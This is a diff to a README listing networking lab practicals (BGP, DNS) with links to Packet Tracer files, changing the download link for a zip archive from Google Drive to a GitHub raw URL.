@@ -31,7 +31,7 @@ Practical No | Program | Link
 3 | Using BGP | [.pkt](https://github.com/bhupendpatil/Practice/blob/master/Networking/3%203router%203pc%20bgp.pkt)
 4 | DNS for small network | [.pkt](https://github.com/bhupendpatil/Practice/blob/master/Networking/4%20DNS%20for%20small%20network.pkt)
 
-Download [.zip](https://drive.google.com/open?id=1UHgRD8MnYHdS-8e61Io1Ey1oFK83HKj5)
+Download [.zip](https://raw.githubusercontent.com/bhupendpatil/Practice/raw/Raw/AncPartial.zip)
 
 ## ADBMS
 Practical No | Program | Link
